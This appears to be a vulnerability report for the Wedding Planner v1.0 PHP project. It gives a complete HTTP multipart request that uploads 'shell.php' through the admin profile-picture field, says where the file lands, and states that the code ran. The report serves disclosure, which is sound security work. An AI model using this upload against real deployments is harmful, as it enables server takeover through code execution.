# Wedding Planner v1.0 by pushpam02 has arbitrary code execution (RCE)

BUG_Author：李趴菜

vendor: https://www.sourcecodester.com/php/15375/wedding-planner-project-php-free-download.html

Vulnerability url: http://ip/Wedding-Management-PHP/admin/blog_events_edit.php?id=31

Loophole location：The editing function of "Liam moore" module in the background management system-- > there is an arbitrary file upload vulnerability (RCE) in the picture upload point of "users_profile.php" file.

Click "Edit My Account" to save

Request package for file upload：

```sql
POST /Wedding-Management-PHP/admin/users_profile.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/Wedding-Management-PHP/admin/users_profile.php
Cookie: PHPSESSID=ncd6h7doujvbbft46r0m7mbr6s
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------11146289715390
Content-Length: 1065

-----------------------------11146289715390
Content-Disposition: form-data; name="profile_picture"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------11146289715390
Content-Disposition: form-data; name="firstname"

Liam
-----------------------------11146289715390
Content-Disposition: form-data; name="lastname"

Moore
-----------------------------11146289715390
Content-Disposition: form-data; name="email"

admin@mail.com
-----------------------------11146289715390
Content-Disposition: form-data; name="username"

adminliam
-----------------------------11146289715390
Content-Disposition: form-data; name="gender"

m
-----------------------------11146289715390
Content-Disposition: form-data; name="address"

Grand Meadows
-----------------------------11146289715390
Content-Disposition: form-data; name="designation"

0
-----------------------------11146289715390
Content-Disposition: form-data; name="submit"


-----------------------------11146289715390--
```

The files will be uploaded to this directory \Wedding-Management-PHP\admin\upload\users
![image](https://user-images.githubusercontent.com/54017627/183275035-99933688-74e1-4236-a955-b89a8e3b465e.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/183275043-85624b9d-d472-4438-870b-a28f60632619.png)

